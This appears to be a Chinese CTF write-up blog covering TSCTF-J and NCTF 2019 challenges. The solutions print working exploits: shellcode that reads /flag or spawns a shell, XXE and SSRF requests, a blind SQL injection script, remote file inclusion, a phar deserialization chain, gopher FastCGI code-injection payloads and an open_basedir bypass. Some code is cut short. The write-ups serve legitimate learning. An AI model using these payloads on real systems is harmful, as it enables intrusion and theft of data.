无脑丢进IDA pro发现一堆golang的东西，啥都看不懂。。。。。 抱着侥幸心理用了一下strings 发现真的有flag......还是真的flag root@EDI:~/desktop# strings re1_GoGoGo | grep \"TSCTF-J\" unlock: lock countsignal received during forksigsend: inconsistent statestack size not a power of 2startm: negative nmspinningstopTheWorld: holding lockstime: invalid location namework.nwait was > work.nproc args stack map entries for 18189894035458564758300781259094947017729282379150390625FixedStack is not power-of-2Prepended_Concatenation_MarkSIGHUP: terminal line hangupSIGWINCH: window size changeTSCTF-J{Amazing_G0_6a8bef9a}[originating from goroutine can't preserve unlinked spancomparing uncomparable type destination address requiredfatal: morestack on gsignal 得到flag:TSCTF-J{Amazing_G0_6a8bef9a} 0x07 流量分析 丢进wireshark先看下 一堆TCP....HTTP 偷懒看看能不能直接扒文件 使用自带的导出HTTP对象工具果然有很多东西 把他们保存下来 其中有个34kb的files 很显然里面有个jpg 把Webkit去掉后另存为jpg图片 得到 Flag:TSCTF-J{M1SC_ez_LaLA} 0x08 现场招新 ps拼接碎片二维码 Flag：TSCTF-J{We1C0me_t0_0uBh3} 0x09 pwnboy 我一定好好学汇编。。。。。。 0x0A shell2 /bin没了 没有现成的执行sh或者cat的操作了 只能自己写一个shellcode1 但是我还不会写。。。。。。 最后从shellcode-storm上找到一个读/etc/passwd的 那不是把/etc/passwd改成/flag就行了嘛！！！！（非预期做法） shellcode.asm BITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 Shellcode ; Shellcode size 82 bytes global _start section .text _start: jmp _push_filename _readfile: ; syscall open file pop rdi ; pop path value ; NULL byte fix xor byte [rdi + 11], 0x41 xor rax, rax add al, 2 xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rdx, rdx mov dx, 0xfff; size to read xor rax, rax syscall ; syscall write to stdout xor rdi, rdi add dil, 1 ; set stdout fd = 1 mov rdx, rax xor rax, rax add al, 1 syscall ; syscall exit xor rax, rax add al, 60 syscall _push_filename: call _readfile path: db \"/flag\";改了一下读的东西。。。。。 exp #coding=utf-8 from pwn import * context(arch = 'amd64', os = 'linux') dist=remote(\"10.117.101.73\",\"10011\") shellcode=\"\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f\\x66\\x6c\\x61\\x67\" dist.send(shellcode) dist.interactive() Flag：TSCTF-J{shellc0de-w1thout-she1l} 0x0B shell1 放进idapro发现shellcode限制长度16h,也即22个字节 一开始发现可能要用shellcode 拆解跳转的那套理论 后来发现居然真的能搜到满足要求的 exp #coding=utf-8 from pwn import * dist=remote(\"10.117.101.73\",\"10010\") shellcode=\"\\x31\\xF6\\x56\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x54\\x5F\\xF7\\xEE\\xB0\\x3B\\x0F\\x05\" dist.send(shellcode) dist.interactive() 0x0C largeCMS? google了一下只发现了Typecho 在install.php上有个反序列化漏洞 但是这上面没有。。。。 用nikto扫了一下发现有git泄露 githacker后拿到源码 。。。。 CMS分析能力还是太差 0x0D other_world 看到学长留下的贴心后门system(\"/bin/sh\") 。。。。 但是没有研究透怎么跳转 pwn还是需要好好学习 0x0E King of Kaomoji 自己出的题。。。 感觉好像有些毒瘤了（逃 Step1 F12查看源码修改被hidden的div，删去对应的style属性 得到一系列base64 Step2 直接拖到http://tool.chinaz.com/Tools/Base64.aspx多行解码发现只是一些颜文字 注意到：“在表世界掀桌子好无聊啊” 联想到base64隐写 将所有base64放入stego.txt 利用下面脚本进行base64隐写解密 def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return res def solve_stego(): with open('stego.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\\n', '') norm_line = line.replace('\\n', '').decode('base64').encode('base64').replace('\\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print (res_str) solve_stego() 得到 然而只得到了一个Key,并没有flag Step3 再观察html源码 发现html头注释行 根据上一步给出的key联想到可能利用了snow工具对html进行隐写 snow.exe -C -p \"hmz\" \"C:\\Users\\Eki\\Desktop\\King of Kaomoji.html\" > out.txt 得到 TSCTF-J{←_←→_→→_→ →_→→_→→_→ ←_←→_→→_→ →_→←_←→_→→_→ →_→→_→→_→→_→→_→ ←_←←_←→_→ →_→←_←→_→←_← ←_←→_→ →_→←_← ←_←→_→←_← ←_← ←_←→_→ ←_←→_→→_→→_→→_→ ←_←→_→→_→→_→→_→ →_→←_←→_→→_→ →_→←_←→_→ ←_←→_→ →_→→_→→_→ →_→→_→ →_→→_→→_→ ←_←→_→→_→→_→ ←_←←_← →_→←_←←_← ←_←→_→ →_→←_← →_→←_←→_→←_← ←_←}No,Look at me! Step 4 只有两种符号且用不连续的空格隔开 联想到Morse码 用notepad++自带的替换工具转换为 .-- --- .-- -.-- ----- ..- -.-. .- -. .-. . .- .---- .---- -.-- -.- .- --- -- --- .--- .. -.. .- -. -.-. . 解码得到flag TSCTF-J{wowy0ucanrea11ykaomojidance} 0x0F relax 可能是比赛过程中做的最有感觉的web题 膜Mercy-Lin大佬 翻了一下index.html 啥都没有（听说玩小花仙可以拿flag） 国际惯例先看看robots.txt User-agent: * Disallow: /relax.php Disallow: /heicore.php Disallow: /flag.php 访问flag.php 啥都没 访问heicore.php 还是一片空白 访问relax.php 只有一个小电视 查看源码发现一大段被注释的东西 分号等号啥的看起来就很像js,查了一下发现确实有这种编码方式 总之直接拖到浏览器console里就行了 给出了部分源码 $_ = $_GET['pw']; $__ = $_GET['file']; $___ = $_GET['(>'; include($__); } else{echo '';} 同bypass一题构造payload http://10.117.101.73:10005/relax.php?pw=233&file=https://example.com/666.txt 666.txt里面写的是Two thousand three hundred and thirty-three 然后就得到一个./images/13.jpg 。。。。然而并没有什么用 注意到include函数 然后我们可以用php://filter伪协议来读php源码了！ http://10.117.101.73:10005/relax.php?pw=php://filter/read=convert.base64-encode/resource=flag.php&file=https://example.com/666.txt 显示It's not that simple 而且发现只要file里存在flag 就会提示 It's not that simple 估计是被过滤了 那先读heicore.php把 http://10.117.101.73:10005/relax.php?pw=php://filter/read=convert.base64-encode/resource=heicore.php&file=https://example.com/666.txt base64解码得到 file)){ echo file_get_contents($this->file); } } } ?> 估计就用是这里的file_get_contents($this->file)读flag了 但是怎么整呢 想了很长时间才发现要不要把relax.php自己的源码也读一遍呢。。。。 试了一下发现还是长度过长最后的base64没了（后面的颜文字的过长了） 不过去掉最后的几个字符就可以正常解码了 得到 '; if(preg_match(\"/flag/i\",$__)){ echo \"It's not that simple\"; exit(); }else{ include($__); unserialize($___); } }else{ echo ''; } ?> flag真的被过滤了 然后还有个反序列化漏洞。。。。 + payload: http://10.117.101.73:10005/relax.php?pw=https://ieki.xyz/666.txt&file=heicore.php&(> base64解码得到flag TSCTF-J{h2PIfsbXwmqKaZhXjnbJ} 0x10 PNG 解压得到两个png 提示对比宽度 然后直接winhex修改 对比一下.png的长宽为另一个文件的长宽 然后得到一个去掉了定位标识的二维码 PS加上定位符即可 Flag:flag{You_gEtThe_Flag OHooo} 0x11 23333 拖到IDA里 加密算法为 while ( v1 在IDA里找到对应的密文为：{'q','v','f','q','c',8,'o','^','w',0x16,'D',0x14,'I','\\','z',0x17,0x16,0x16,0x16,0x16,'X',0} 对应解密就完了 #include #include char str[]={'q','v','f','q','c',8,'o','^','w',0x16,'D',0x14,'I','\\\\','z',0x17,0x16,0x16,0x16,0x16,'X',0}; int main(){ int len=strlen(str); for(int i=0;i Flag：TSCTF-J{R3a1ly_23333} 0x12 Name 出题人太巨了 没整明白。。。。。。 0x13 Logfile 想着动态调试直接得log 然而比赛的时候还是不会。。。。 0x14 诗集 用搜图才知道这个人是谁（ 维吉尼亚密码 因为有两行是明文又是诗句 百度一些把所有明文都找出来了 然后又告诉你密钥长度为7了 直接对着表逆推。。。。 Opw lvcgvvxr xzokpl tcm fsumiqm hcwk And laughter crowns the restive hour, OCT AVWA （最后居然懒得看一下是不是真的一模一样得诗导致一直交错flag.....） Flag:TSCTF-J{octavwa_thee} 0x15 Keyboard 因为题面我尝试了在键盘上画圈。。。。 然而并没有什么卵用 做了Q->A的映射 还是乱码 最后盲猜应该是某种单表置换吧 扔进quipquip.com得到 TSCTF-J{use_your_standard_keyboard} 对着键盘后来才发现。。。。 原来是左移一位。。。。。。 0x16 bypass-Revenge 好像。。。 用bypass的payload可以直接过。。。。。 0x17 HarukaRadio 一开始扔进Audacity的频谱图还以为是个morse码，但是后面很多都循环了 当时也不知道为什么。。。。。 给到第三个Hint 才发现是ISS的传统艺能 慢扫描电视（SSTV） 用RX-SSTV接收 wav就可以了吧。。。。。。 然而不会用pulseaudio。。。。 只能得到这种清晰度的。。。。 Flag:tsctf-j{yuan3s3_rad10} 0x18 CykaPredictMan 想着暴力逆推种子的 但是跑了很久都没有跑出来 好像是因为python版本问题。。。 也没有做出预期解法 0x19 不眠之夜之天气之子 头铁拼图流程 找原图 放ps里照着原图拼合。。 筛掉没有红线的图块 拼差不多了直接猜Flag吧。。。。。。 Flag:TSCTF-J{WeAth3R_W1th_Y0u} 0x1A White And Black 没有提示的话一般zip应该都是伪加密 一开始直接在winhex里改加密标记的 结果解出来的flag.png还是坏的。。。 以为真的要暴力破解 卡了很久很久 结果用winrar修复也得到相同结果s 扫了一眼hex应该也是对的。。。 然后看看是不是png有了损坏 直接找了工具PCRT 修复png 得到 放进 https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx 解码 得到 flag:Merakctf{F1@9_Is_R19H7} © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/nctf2019.html":{"url":"contest/nctf2019.html","title":"NCTF 2019","keywords":"","body":"NCTF 游记0x00 前言0x01 Fake XML cookbook0x02 True XML cookbook0x03 SQLi (赛后复现)0x04 phar matches everything (赛后复现)0x05 easyphp0x06 replace0x07 flask0x08 Upload your Shell0x09 flask_website0x0A simple_xss0x0B hacker_backdoor0x0C tsb0x0D 难看的代码0x0E 签到题0x0F DEBUG0x10 Our 16bit Games0x11 Easy Ternary0x12 你大概需要一个带bar的mac0x13 math_easy0x14 hello_pwn0x15 pwn me 100 years! (I)0x16 pwn me 100 years! (II)0x17 ~ 0x1C(pwn)0x1D Keyboard0x1E~0x21 (Crypto)0x22 a_good_idea0x23 Become a Rockstar0x24 Bright Body I0x25 有内鬼,终止交易0x26 小狗的秘密0x27 键盘侠0x28 What's this0x29 20770x2A pip installNCTF 游记 0x00 前言 又是一场被大佬出的“入门新手基础水题”虐爆的比赛。。。。。。。 pwn2和流量分析做的心态爆炸。。。。导致正常比赛下来都没做出啥题（其实是菜。。。。。。 最终盗版战队止步前十。。。。天璇的其他大佬都好强啊！(群除我佬。。。。) 收货： XEE攻击基本方法 linux 系统中一些敏感文件及其作用 利用PIL写绘图脚本 chr().拼接字符串绕过引号限制 Wireshark 基本过滤操作的语法 SSRF 攻击 Todo: XXS 攻击的具体操作和原理 PIE 保护情况下基址的泄露方法和64位按字节写入的操作。。。。。。。。 一堆pwn的知识点 rop heap........ Crypto密码学相关知识 RSA AES....... 逆向patch..... 0x01 Fake XML cookbook F12看了一眼发现 function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"\" + username + \"\" + password + \"\"; $.ajax({ type: \"POST\", url: \"doLogin.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } 用XML和服务器通讯，联想到XXE攻击 burp抓post包得到 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close admin123 根据js脚本可以发现username是可以回显的 然后构造一下exp POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close ]> &xxe;123 0x02 True XML cookbook 相当于第一题的加强版本 现在/flag里东西没了 看题目描述一开始以为要用上phar之类的骚操作，但是没有其他上传点了 fuzz读了一下 /var/www/html/doLogin.php 倒是有admin的密码了。。。 但是没啥用 读了/bin/sh 居然是有的。。。。 再读了读/etc/hosts 和/proc/net/arp 内网ip泄露 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.18.0.2 3b6bacb4719b IP address HW type Flags HW address Mask Device 192.168.1.40 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.75 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.55 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.16 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.63 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.249 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.24 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.39 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.70 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.47 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.8 0x1 0x2 02:42:c0:a8:01:08 * eth0 192.168.1.244 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.23 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.50 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.252 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.31 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.58 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.69 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.7 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.34 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.77 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.15 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.42 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.49 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.243 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.18 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.57 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.251 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.26 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.33 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.64 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.2 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.41 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.72 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.10 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.52 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.246 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.17 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.60 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.254 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.25 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.36 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.71 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.1 0x1 0x2 02:42:ea:57:7a:1c * eth0 192.168.1.44 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.9 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.245 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.20 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.51 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.253 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.28 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.59 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.4 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.35 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.66 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.12 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.43 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.74 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.54 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.19 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.62 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.248 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.27 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.38 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.65 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.3 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.46 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.73 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.11 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.53 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.247 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.22 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.61 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.30 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.37 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.68 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.6 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.45 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.76 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.14 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.21 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.48 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.242 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.29 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.56 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.250 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.5 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.32 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.67 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.1.13 0x1 0x0 00:00:00:00:00:00 * eth0 SSRF Burp Suite Introuder 爆破 192.168.1.8出了flag..... POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40003 Content-Length: 220 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40003 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close ]> &xxe;123 0x03 SQLi (赛后复现) 直接给了sql语句 select * from users where username='' and passwd='' 但是过滤了一堆select . or ' like基本都过滤了 然后这里的bypass技巧是 单引号可以使用\\来转义绕过，or可以采用|| =可以采用regexp,#可以用`\\x00替代 然后基本上么得跨表查询，就只能盲注爆破password了 exp 核心代码部分 def boolequ(start,end): ret=\"\" for i in range(start,end): for ch in pt: payload=\"\"\"||passwd/**/REGEXP/**/\"^{}\";\\x00\"\"\".format(ret+ch) data = { \"username\":'\\\\', \"passwd\":payload } #print data req=requests.post(url,data=data,allow_redirects=False) if req.status_code!=200 and req.status_code!=302: continue if req.status_code==302: ret=ret+ch sys.stdout.write(\"[-]Result : -> {0} \"+ret+\" 0x04 phar matches everything (赛后复现) ...原题可以拿到源码，但似乎buuoj上不行 能拿到的源码是cathmine.php test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test->funny_get() === '1'){ echo $this->curl($this->url); } } } if(isset($_POST[\"submit\"])) { $check = getimagesize($_POST['name']); if($check !== false) { echo \"File is an image - \" . $check[\"mime\"] . \".\"; } else { echo \"File is not an image.\"; } } ?> 这里藏了一个ssrf 但是不能直接用这个php打，因为url不可控 判断文件类型使用了getimageinfo，所以可以搞phar的反序列化，这里很明显要我们SSRF，首先读下file:///proc/net/arp Exp test; } } class Main { public $url; } $test = new EasyTest; echo urlencode(serialize($test)).\"\\n\"; $payload = new Main; $payload->url = \"file:///proc/net/arp\"; $png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000'); $phar = new Phar('exp.phar'); $phar -> startBuffering(); $phar -> setStub($png_header.''); //设置 stub，增加 gif 文件头 $phar -> addFromString('test.txt','test'); //添加要压缩的文件 $phar -> setMetadata($payload); //将自定义 meta-data 存入 manifest $phar -> stopBuffering(); rename(\"exp.phar\",\"exp.png\"); ?> 拿到 IP address HW type Flags HW address Mask Device 173.236.149.2 0x1 0x2 02:42:ad:ec:95:02 * eth0 /etc/host 拿到 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 173.236.149.9 osrc 但是都么得回显，后来发现是173.236.149.10这个（估计是buuoj的镜像问题 然后访问一下显示 这里用evoa师傅的脚本打 python gopher.srff.exp.py -c \"\" 173.236.149.10 /var/www/html/index.php gopher://127.0.0.1:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00 替换成 gopher://173.236.149.10:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00 可以看到有open_basedir /var/www/html:/tmp 用一个经典的绕过方式 mkdir('eki');chdir('eki');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag')); python gopher.srff.exp.py -c \"\" 173.236.149.10 /var/www/html/index.php gopher://127.0.0.1:9000/_%01%01z%BF%00%08%00%00%00%01%00%00%00%00%00%00%01%04z%BF%01%DC%00%00%0E%03CONTENT_LENGTH171%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04z%BF%00%00%00%00%01%05z%BF%00%AB%00%00%3C%3Fphp%20mkdir%28%27eki%27%29%3Bchdir%28%27eki%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%3F%3E%01%05z%BF%00%00%00%00` 0x05 easyphp 大佬队友带我躺赢。。。。。 0x06 replace 填三个\"#\"报错 Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1 Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70 实现功能使用的是preg_match() 题目提示用了php5.6 想到preg_match() /e参数 试一下可以执行phpinfo() POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=phpinfo(); 但是直接用readfile('/flag')读文件，发现单引号双引号被拦截 于是用chr()拼接表示字符串。。。。。 POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: 